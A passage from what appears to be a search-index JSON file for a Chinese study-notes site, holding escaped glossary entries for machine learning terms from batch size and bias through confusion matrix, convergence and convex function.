\u4e4b\u95f4\u3002\u6279\u6b21\u5927\u5c0f\u5728\u8bad\u7ec3\u548c\u63a8\u65ad\u671f\u95f4\u901a\u5e38\u662f\u56fa\u5b9a\u7684\uff1b\u4e0d\u8fc7\uff0cTensorFlow \u5141\u8bb8\u4f7f\u7528\u52a8\u6001\u6279\u6b21\u5927\u5c0f\u3002","title":"3.4. \u6279\u6b21\u5927\u5c0f (batch size)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#35-bias","text":"\u8ddd\u79bb\u539f\u70b9\u7684\u622a\u8ddd\u6216\u504f\u79fb\u3002\u504f\u5dee\uff08\u4e5f\u79f0\u4e3a\u504f\u5dee\u9879\uff09\u5728\u673a\u5668\u5b66\u4e60\u6a21\u578b\u4e2d\u7528 b \u6216 w~0~ \u8868\u793a\u3002\u4f8b\u5982\uff0c\u5728\u4e0b\u9762\u7684\u516c\u5f0f\u4e2d\uff0c\u504f\u5dee\u4e3a b\uff1a y' = b + w_1 x_1 + w_2 x_2 + \\dots + w_n x_n \u8bf7\u52ff\u4e0e \u9884\u6d4b\u504f\u5dee \u6df7\u6dc6\u3002","title":"3.5. \u504f\u5dee (bias)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#36-binary-classification","text":"\u4e00\u79cd\u5206\u7c7b\u4efb\u52a1\uff0c\u53ef\u8f93\u51fa\u4e24\u79cd\u4e92\u65a5\u7c7b\u522b\u4e4b\u4e00\u3002\u4f8b\u5982\uff0c\u5bf9\u7535\u5b50\u90ae\u4ef6\u8fdb\u884c\u8bc4\u4f30\u5e76\u8f93\u51fa\"\u5783\u573e\u90ae\u4ef6\"\u6216\"\u975e\u5783\u573e\u90ae\u4ef6\"\u7684\u673a\u5668\u5b66\u4e60\u6a21\u578b\u5c31\u662f\u4e00\u4e2a\u4e8c\u5143\u5206\u7c7b\u5668\u3002","title":"3.6. \u4e8c\u5143\u5206\u7c7b (binary classification)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#37-binning","text":"\u8bf7\u53c2\u9605 \u5206\u6876 \u3002","title":"3.7. \u5206\u7bb1 (binning)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#38-bucketing","text":"\u5c06\u4e00\u4e2a\u7279\u5f81\uff08\u901a\u5e38\u662f \u8fde\u7eed \u7279\u5f81\uff09\u8f6c\u6362\u6210\u591a\u4e2a\u4e8c\u5143\u7279\u5f81\uff08\u79f0\u4e3a\u6876\u6216\u7bb1\uff09\uff0c\u901a\u5e38\u6839\u636e\u503c\u533a\u95f4\u8fdb\u884c\u8f6c\u6362\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u5c06\u6e29\u5ea6\u533a\u95f4\u5206\u5272\u4e3a\u79bb\u6563\u5206\u7bb1\uff0c\u800c\u4e0d\u662f\u5c06\u6e29\u5ea6\u8868\u793a\u6210\u5355\u4e2a\u8fde\u7eed\u7684\u6d6e\u70b9\u7279\u5f81\u3002\u5047\u8bbe\u6e29\u5ea6\u6570\u636e\u53ef\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e\u4e00\u4f4d\uff0c\u5219\u53ef\u4ee5\u5c06\u4ecb\u4e8e 0.0 \u5230 15.0 \u5ea6\u4e4b\u95f4\u7684\u6240\u6709\u6e29\u5ea6\u90fd\u5f52\u5165\u4e00\u4e2a\u5206\u7bb1\uff0c\u5c06\u4ecb\u4e8e 15.1 \u5230 30.0 \u5ea6\u4e4b\u95f4\u7684\u6240\u6709\u6e29\u5ea6\u5f52\u5165\u7b2c\u4e8c\u4e2a\u5206\u7bb1\uff0c\u5e76\u5c06\u4ecb\u4e8e 30.1 \u5230 50.0 \u5ea6\u4e4b\u95f4\u7684\u6240\u6709\u6e29\u5ea6\u5f52\u5165\u7b2c\u4e09\u4e2a\u5206\u7bb1\u3002","title":"3.8. \u5206\u6876 (bucketing)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#4-c","text":"","title":"4. C"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#41-calibration-layer","text":"\u4e00\u79cd\u9884\u6d4b\u540e\u8c03\u6574\uff0c\u901a\u5e38\u662f\u4e3a\u4e86\u964d\u4f4e \u9884\u6d4b\u504f\u5dee \u7684\u5f71\u54cd\u3002\u8c03\u6574\u540e\u7684\u9884\u6d4b\u548c\u6982\u7387\u5e94\u4e0e\u89c2\u5bdf\u5230\u7684\u6807\u7b7e\u96c6\u7684\u5206\u5e03\u4e00\u81f4\u3002","title":"4.1. \u6821\u51c6\u5c42 (calibration layer)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#42-candidate-sampling","text":"\u4e00\u79cd\u8bad\u7ec3\u65f6\u8fdb\u884c\u7684\u4f18\u5316\uff0c\u4f1a\u4f7f\u7528\u67d0\u79cd\u51fd\u6570\uff08\u4f8b\u5982 softmax\uff09\u9488\u5bf9\u6240\u6709\u6b63\u7c7b\u522b\u6807\u7b7e\u8ba1\u7b97\u6982\u7387\uff0c\u4f46\u5bf9\u4e8e\u8d1f\u7c7b\u522b\u6807\u7b7e\uff0c\u5219\u4ec5\u9488\u5bf9\u5176\u968f\u673a\u6837\u672c\u8ba1\u7b97\u6982\u7387\u3002\u4f8b\u5982\uff0c\u5982\u679c\u67d0\u4e2a\u6837\u672c\u7684\u6807\u7b7e\u4e3a\"\u5c0f\u730e\u72ac\"\u548c\"\u72d7\"\uff0c\u5219\u5019\u9009\u91c7\u6837\u5c06\u9488\u5bf9\"\u5c0f\u730e\u72ac\"\u548c\"\u72d7\"\u7c7b\u522b\u8f93\u51fa\u4ee5\u53ca\u5176\u4ed6\u7c7b\u522b\uff08\u732b\u3001\u68d2\u68d2\u7cd6\u3001\u6805\u680f\uff09\u7684\u968f\u673a\u5b50\u96c6\u8ba1\u7b97\u9884\u6d4b\u6982\u7387\u548c\u76f8\u5e94\u7684\u635f\u5931\u9879\u3002\u8fd9\u79cd\u91c7\u6837\u57fa\u4e8e\u7684\u60f3\u6cd5\u662f\uff0c\u53ea\u8981 \u6b63\u7c7b\u522b \u59cb\u7ec8\u5f97\u5230\u9002\u5f53\u7684\u6b63\u589e\u5f3a\uff0c \u8d1f\u7c7b\u522b \u5c31\u53ef\u4ee5\u4ece\u9891\u7387\u8f83\u4f4e\u7684\u8d1f\u589e\u5f3a\u4e2d\u8fdb\u884c\u5b66\u4e60\uff0c\u8fd9\u786e\u5b9e\u662f\u5728\u5b9e\u9645\u4e2d\u89c2\u5bdf\u5230\u7684\u60c5\u51b5\u3002\u5019\u9009\u91c7\u6837\u7684\u76ee\u7684\u662f\uff0c\u901a\u8fc7\u4e0d\u9488\u5bf9\u6240\u6709\u8d1f\u7c7b\u522b\u8ba1\u7b97\u9884\u6d4b\u7ed3\u679c\u6765\u63d0\u9ad8\u8ba1\u7b97\u6548\u7387\u3002","title":"4.2. \u5019\u9009\u91c7\u6837 (candidate sampling)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#43-categorical-data","text":"\u4e00\u79cd \u7279\u5f81 \uff0c\u62e5\u6709\u4e00\u7ec4\u79bb\u6563\u7684\u53ef\u80fd\u503c\u3002\u4ee5\u67d0\u4e2a\u540d\u4e3a house style \u7684\u5206\u7c7b\u7279\u5f81\u4e3a\u4f8b\uff0c\u8be5\u7279\u5f81\u62e5\u6709\u4e00\u7ec4\u79bb\u6563\u7684\u53ef\u80fd\u503c\uff08\u5171\u4e09\u4e2a\uff09\uff0c\u5373 Tudor, ranch, colonial \u3002\u901a\u8fc7\u5c06 house style \u8868\u793a\u6210\u5206\u7c7b\u6570\u636e\uff0c\u76f8\u5e94\u6a21\u578b\u53ef\u4ee5\u5b66\u4e60 Tudor \u3001 ranch \u548c colonial \u5206\u522b\u5bf9\u623f\u4ef7\u7684\u5f71\u54cd\u3002 \u6709\u65f6\uff0c\u79bb\u6563\u96c6\u4e2d\u7684\u503c\u662f\u4e92\u65a5\u7684\uff0c\u53ea\u80fd\u5c06\u5176\u4e2d\u4e00\u4e2a\u503c\u5e94\u7528\u4e8e\u6307\u5b9a\u6837\u672c\u3002\u4f8b\u5982\uff0c car maker \u5206\u7c7b\u7279\u5f81\u53ef\u80fd\u53ea\u5141\u8bb8\u4e00\u4e2a\u6837\u672c\u6709\u4e00\u4e2a\u503c ( Toyota )\u3002\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u5219\u53ef\u4ee5\u5e94\u7528\u591a\u4e2a\u503c\u3002\u4e00\u8f86\u8f66\u53ef\u80fd\u4f1a\u88ab\u55b7\u6d82\u591a\u79cd\u4e0d\u540c\u7684\u989c\u8272\uff0c\u56e0\u6b64\uff0c car color \u5206\u7c7b\u7279\u5f81\u53ef\u80fd\u4f1a\u5141\u8bb8\u5355\u4e2a\u6837\u672c\u5177\u6709\u591a\u4e2a\u503c\uff08\u4f8b\u5982 red \u548c white \uff09\u3002 \u5206\u7c7b\u7279\u5f81\u6709\u65f6\u79f0\u4e3a \u79bb\u6563\u7279\u5f81 \u3002 \u4e0e \u6570\u503c\u6570\u636e \u76f8\u5bf9\u3002","title":"4.3. \u5206\u7c7b\u6570\u636e (categorical data)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#44-centroid","text":"\u805a\u7c7b\u7684\u4e2d\u5fc3\uff0c\u7531 k-means \u6216 k-median \u7b97\u6cd5\u51b3\u5b9a\u3002\u4f8b\u5982\uff0c\u5982\u679c k \u4e3a 3\uff0c\u5219 k-means \u6216 k-median \u7b97\u6cd5\u4f1a\u627e\u51fa 3 \u4e2a\u5f62\u5fc3\u3002","title":"4.4. \u5f62\u5fc3 (centroid)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#45-checkpoint","text":"\u4e00\u79cd\u6570\u636e\uff0c\u7528\u4e8e\u6355\u83b7\u6a21\u578b\u53d8\u91cf\u5728\u7279\u5b9a\u65f6\u95f4\u7684\u72b6\u6001\u3002\u501f\u52a9\u68c0\u67e5\u70b9\uff0c\u53ef\u4ee5\u5bfc\u51fa\u6a21\u578b \u6743\u91cd \uff0c\u8de8\u591a\u4e2a\u4f1a\u8bdd\u6267\u884c\u8bad\u7ec3\uff0c\u4ee5\u53ca\u4f7f\u8bad\u7ec3\u5728\u53d1\u751f\u9519\u8bef\u4e4b\u540e\u5f97\u4ee5\u7ee7\u7eed\uff08\u4f8b\u5982\u4f5c\u4e1a\u62a2\u5360\uff09\u3002\u8bf7\u6ce8\u610f\uff0c \u56fe \u672c\u8eab\u4e0d\u5305\u542b\u5728\u68c0\u67e5\u70b9\u4e2d\u3002","title":"4.5. \u68c0\u67e5\u70b9 (checkpoint)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#46-class","text":"\u4e3a\u6807\u7b7e\u679a\u4e3e\u7684\u4e00\u7ec4\u76ee\u6807\u503c\u4e2d\u7684\u4e00\u4e2a\u3002\u4f8b\u5982\uff0c\u5728\u68c0\u6d4b\u5783\u573e\u90ae\u4ef6\u7684 \u4e8c\u5143\u5206\u7c7b \u6a21\u578b\u4e2d\uff0c\u4e24\u79cd\u7c7b\u522b\u5206\u522b\u662f\"\u5783\u573e\u90ae\u4ef6\"\u548c\"\u975e\u5783\u573e\u90ae\u4ef6\"\u3002\u5728\u8bc6\u522b\u72d7\u54c1\u79cd\u7684 \u591a\u7c7b\u522b\u5206\u7c7b \u6a21\u578b\u4e2d\uff0c\u7c7b\u522b\u53ef\u4ee5\u662f\"\u8d35\u5bbe\u72ac\"\u3001\"\u5c0f\u730e\u72ac\"\u3001\"\u54c8\u5df4\u72ac\"\u7b49\u7b49\u3002","title":"4.6. \u7c7b\u522b (class)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#47-class-imbalanced-data-set","text":"\u4e00\u79cd \u4e8c\u5143\u5206\u7c7b \u95ee\u9898\uff0c\u5728\u6b64\u7c7b\u95ee\u9898\u4e2d\uff0c\u4e24\u79cd\u7c7b\u522b\u7684 \u6807\u7b7e \u5728\u51fa\u73b0\u9891\u7387\u65b9\u9762\u5177\u6709\u5f88\u5927\u7684\u5dee\u8ddd\u3002\u4f8b\u5982\uff0c\u5728\u67d0\u4e2a\u75be\u75c5\u6570\u636e\u96c6\u4e2d\uff0c0.0001 \u7684\u6837\u672c\u5177\u6709\u6b63\u7c7b\u522b\u6807\u7b7e\uff0c0.9999 \u7684\u6837\u672c\u5177\u6709\u8d1f\u7c7b\u522b\u6807\u7b7e\uff0c\u8fd9\u5c31\u5c5e\u4e8e\u5206\u7c7b\u4e0d\u5e73\u8861\u95ee\u9898\uff1b\u4f46\u5728\u67d0\u4e2a\u8db3\u7403\u6bd4\u8d5b\u9884\u6d4b\u5668\u4e2d\uff0c0.51 \u7684\u6837\u672c\u7684\u6807\u7b7e\u4e3a\u5176\u4e2d\u4e00\u4e2a\u7403\u961f\u8d62\uff0c0.49 \u7684\u6837\u672c\u7684\u6807\u7b7e\u4e3a\u53e6\u4e00\u4e2a\u7403\u961f\u8d62\uff0c\u8fd9\u5c31\u4e0d\u5c5e\u4e8e\u5206\u7c7b\u4e0d\u5e73\u8861\u95ee\u9898\u3002","title":"4.7. \u5206\u7c7b\u4e0d\u5e73\u8861\u7684\u6570\u636e\u96c6 (class-imbalanced data set)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#48-classification-model","text":"\u4e00\u79cd\u673a\u5668\u5b66\u4e60\u6a21\u578b\uff0c\u7528\u4e8e\u533a\u5206\u4e24\u79cd\u6216\u591a\u79cd\u79bb\u6563\u7c7b\u522b\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u81ea\u7136\u8bed\u8a00\u5904\u7406\u5206\u7c7b\u6a21\u578b\u53ef\u4ee5\u786e\u5b9a\u8f93\u5165\u7684\u53e5\u5b50\u662f\u6cd5\u8bed\u3001\u897f\u73ed\u7259\u8bed\u8fd8\u662f\u610f\u5927\u5229\u8bed\u3002\u8bf7\u4e0e \u56de\u5f52\u6a21\u578b \u8fdb\u884c\u6bd4\u8f83\u3002","title":"4.8. \u5206\u7c7b\u6a21\u578b (classification model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#49-classification-threshold","text":"\u4e00\u79cd\u6807\u91cf\u503c\u6761\u4ef6\uff0c\u5e94\u7528\u4e8e\u6a21\u578b\u9884\u6d4b\u7684\u5f97\u5206\uff0c\u65e8\u5728\u5c06 \u6b63\u7c7b\u522b \u4e0e \u8d1f\u7c7b\u522b \u533a\u5206\u5f00\u3002\u5c06 \u903b\u8f91\u56de\u5f52 \u7ed3\u679c\u6620\u5c04\u5230 \u4e8c\u5143\u5206\u7c7b \u65f6\u4f7f\u7528\u3002\u4ee5\u67d0\u4e2a\u903b\u8f91\u56de\u5f52\u6a21\u578b\u4e3a\u4f8b\uff0c\u8be5\u6a21\u578b\u7528\u4e8e\u786e\u5b9a\u6307\u5b9a\u7535\u5b50\u90ae\u4ef6\u662f\u5783\u573e\u90ae\u4ef6\u7684\u6982\u7387\u3002\u5982\u679c\u5206\u7c7b\u9608\u503c\u4e3a 0.9\uff0c\u90a3\u4e48\u903b\u8f91\u56de\u5f52\u503c\u9ad8\u4e8e 0.9 \u7684\u7535\u5b50\u90ae\u4ef6\u5c06\u88ab\u5f52\u7c7b\u4e3a\"\u5783\u573e\u90ae\u4ef6\"\uff0c\u4f4e\u4e8e 0.9 \u7684\u5219\u88ab\u5f52\u7c7b\u4e3a\"\u975e\u5783\u573e\u90ae\u4ef6\"\u3002","title":"4.9. \u5206\u7c7b\u9608\u503c (classification threshold)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#410-clustering","text":"\u5c06\u5173\u8054\u7684 \u6837\u672c \u5206\u6210\u4e00\u7ec4\uff0c\u4e00\u822c\u7528\u4e8e \u975e\u76d1\u7763\u5f0f\u5b66\u4e60 \u3002\u5728\u6240\u6709\u6837\u672c\u5747\u5206\u7ec4\u5b8c\u6bd5\u540e\uff0c\u76f8\u5173\u4eba\u5458\u4fbf\u53ef\u9009\u62e9\u6027\u5730\u4e3a\u6bcf\u4e2a\u805a\u7c7b\u8d4b\u4e88\u542b\u4e49\u3002 \u805a\u7c7b\u7b97\u6cd5\u6709\u5f88\u591a\u3002\u4f8b\u5982\uff0c k-means \u7b97\u6cd5\u4f1a\u57fa\u4e8e\u6837\u672c\u4e0e \u5f62\u5fc3 \u7684\u63a5\u8fd1\u7a0b\u5ea6\u805a\u7c7b\u6837\u672c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u4e4b\u540e\uff0c\u7814\u7a76\u4eba\u5458\u4fbf\u53ef\u67e5\u770b\u8fd9\u4e9b\u805a\u7c7b\u5e76\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\uff0c\u4f8b\u5982\uff0c\u5c06\u805a\u7c7b 1 \u6807\u8bb0\u4e3a\"\u77ee\u578b\u6811\"\uff0c\u5c06\u805a\u7c7b 2 \u6807\u8bb0\u4e3a\"\u5168\u5c3a\u5bf8\u6811\"\u3002 \u518d\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4f8b\u5982\u57fa\u4e8e\u6837\u672c\u4e0e\u4e2d\u5fc3\u70b9\u8ddd\u79bb\u7684\u805a\u7c7b\u7b97\u6cd5\uff0c\u5982\u4e0b\u6240\u793a\uff1a","title":"4.10. \u805a\u7c7b (clustering)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#411-collaborative-filtering","text":"\u6839\u636e\u5f88\u591a\u5176\u4ed6\u7528\u6237\u7684\u5174\u8da3\u6765\u9884\u6d4b\u67d0\u4f4d\u7528\u6237\u7684\u5174\u8da3\u3002\u534f\u540c\u8fc7\u6ee4\u901a\u5e38\u7528\u5728\u63a8\u8350\u7cfb\u7edf\u4e2d\u3002","title":"4.11. \u534f\u540c\u8fc7\u6ee4 (collaborative filtering)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#412-confusion-matrix","text":"\u4e00\u79cd NxN \u8868\u683c\uff0c\u7528\u4e8e\u603b\u7ed3 \u5206\u7c7b\u6a21\u578b \u7684\u9884\u6d4b\u6548\u679c\uff1b\u5373\u6807\u7b7e\u548c\u6a21\u578b\u9884\u6d4b\u7684\u5206\u7c7b\u4e4b\u95f4\u7684\u5173\u8054\u3002\u5728\u6df7\u6dc6\u77e9\u9635\u4e2d\uff0c\u4e00\u4e2a\u8f74\u8868\u793a\u6a21\u578b\u9884\u6d4b\u7684\u6807\u7b7e\uff0c\u53e6\u4e00\u4e2a\u8f74\u8868\u793a\u5b9e\u9645\u6807\u7b7e\u3002N \u8868\u793a\u7c7b\u522b\u4e2a\u6570\u3002\u5728 \u4e8c\u5143\u5206\u7c7b \u95ee\u9898\u4e2d\uff0cN=2\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u663e\u793a\u4e86\u4e00\u4e2a\u4e8c\u5143\u5206\u7c7b\u95ee\u9898\u7684\u6df7\u6dc6\u77e9\u9635\u793a\u4f8b\uff1a \u80bf\u7624\uff08\u9884\u6d4b\u7684\u6807\u7b7e\uff09 \u975e\u80bf\u7624\uff08\u9884\u6d4b\u7684\u6807\u7b7e\uff09 \u80bf\u7624\uff08\u5b9e\u9645\u6807\u7b7e\uff09 18 1 \u975e\u80bf\u7624\uff08\u5b9e\u9645\u6807\u7b7e\uff09 6 452 \u4e0a\u9762\u7684\u6df7\u6dc6\u77e9\u9635\u663e\u793a\uff0c\u5728 19 \u4e2a\u5b9e\u9645\u6709\u80bf\u7624\u7684\u6837\u672c\u4e2d\uff0c\u8be5\u6a21\u578b\u6b63\u786e\u5730\u5c06 18 \u4e2a\u5f52\u7c7b\u4e3a\u6709\u80bf\u7624\uff0818 \u4e2a\u6b63\u4f8b\uff09\uff0c\u9519\u8bef\u5730\u5c06 1 \u4e2a\u5f52\u7c7b\u4e3a\u6ca1\u6709\u80bf\u7624\uff081 \u4e2a\u5047\u8d1f\u4f8b\uff09\u3002\u540c\u6837\uff0c\u5728 458 \u4e2a\u5b9e\u9645\u6ca1\u6709\u80bf\u7624\u7684\u6837\u672c\u4e2d\uff0c\u6a21\u578b\u5f52\u7c7b\u6b63\u786e\u7684\u6709 452 \u4e2a\uff08452 \u4e2a\u8d1f\u4f8b\uff09\uff0c\u5f52\u7c7b\u9519\u8bef\u7684\u6709 6 \u4e2a\uff086 \u4e2a\u5047\u6b63\u4f8b\uff09\u3002 \u591a\u7c7b\u522b\u5206\u7c7b\u95ee\u9898\u7684\u6df7\u6dc6\u77e9\u9635\u6709\u52a9\u4e8e\u786e\u5b9a\u51fa\u9519\u6a21\u5f0f\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u6df7\u6dc6\u77e9\u9635\u53ef\u4ee5\u63ed\u793a\uff0c\u67d0\u4e2a\u7ecf\u8fc7\u8bad\u7ec3\u4ee5\u8bc6\u522b\u624b\u5199\u6570\u5b57\u7684\u6a21\u578b\u5f80\u5f80\u4f1a\u5c06 4 \u9519\u8bef\u5730\u9884\u6d4b\u4e3a 9\uff0c\u5c06 7 \u9519\u8bef\u5730\u9884\u6d4b\u4e3a 1\u3002 \u6df7\u6dc6\u77e9\u9635\u5305\u542b\u8ba1\u7b97\u5404\u79cd\u6548\u679c\u6307\u6807\uff08\u5305\u62ec \u7cbe\u786e\u7387 \u548c \u53ec\u56de\u7387 \uff09\u6240\u9700\u7684\u5145\u8db3\u4fe1\u606f\u3002","title":"4.12. \u6df7\u6dc6\u77e9\u9635 (confusion matrix)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#413-continuous-feature","text":"\u4e00\u79cd\u6d6e\u70b9\u7279\u5f81\uff0c\u53ef\u80fd\u503c\u7684\u533a\u95f4\u4e0d\u53d7\u9650\u5236\u3002\u4e0e \u79bb\u6563\u7279\u5f81 \u76f8\u5bf9\u3002","title":"4.13. \u8fde\u7eed\u7279\u5f81 (continuous feature)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#414-convergence","text":"\u901a\u4fd7\u6765\u8bf4\uff0c\u6536\u655b\u901a\u5e38\u662f\u6307\u5728\u8bad\u7ec3\u671f\u95f4\u8fbe\u5230\u7684\u4e00\u79cd\u72b6\u6001\uff0c\u5373\u7ecf\u8fc7\u4e00\u5b9a\u6b21\u6570\u7684\u8fed\u4ee3\u4e4b\u540e\uff0c\u8bad\u7ec3 \u635f\u5931 \u548c\u9a8c\u8bc1\u635f\u5931\u5728\u6bcf\u6b21\u8fed\u4ee3\u4e2d\u7684\u53d8\u5316\u90fd\u975e\u5e38\u5c0f\u6216\u6839\u672c\u6ca1\u6709\u53d8\u5316\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u91c7\u7528\u5f53\u524d\u6570\u636e\u8fdb\u884c\u989d\u5916\u7684\u8bad\u7ec3\u5c06\u65e0\u6cd5\u6539\u8fdb\u6a21\u578b\uff0c\u6a21\u578b\u5373\u8fbe\u5230\u6536\u655b\u72b6\u6001\u3002\u5728\u6df1\u5ea6\u5b66\u4e60\u4e2d\uff0c\u635f\u5931\u503c\u6709\u65f6\u4f1a\u5728\u6700\u7ec8\u4e0b\u964d\u4e4b\u524d\u7684\u591a\u6b21\u8fed\u4ee3\u4e2d\u4fdd\u6301\u4e0d\u53d8\u6216\u51e0\u4e4e\u4fdd\u6301\u4e0d\u53d8\uff0c\u6682\u65f6\u5f62\u6210\u6536\u655b\u7684\u5047\u8c61\u3002 \u53e6\u8bf7\u53c2\u9605 \u65e9\u505c\u6cd5 \u3002 \u53e6\u8bf7\u53c2\u9605 Boyd \u548c Vandenberghe \u5408\u8457\u7684 Convex Optimization \uff08\u300a\u51f8\u4f18\u5316\u300b\uff09\u3002","title":"4.14. \u6536\u655b (convergence)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#415-convex-function","text":"\u4e00\u79cd\u51fd\u6570\uff0c\u51fd\u6570\u56fe\u50cf\u4ee5\u4e0a\u7684\u533a\u57df\u4e3a \u51f8\u96c6 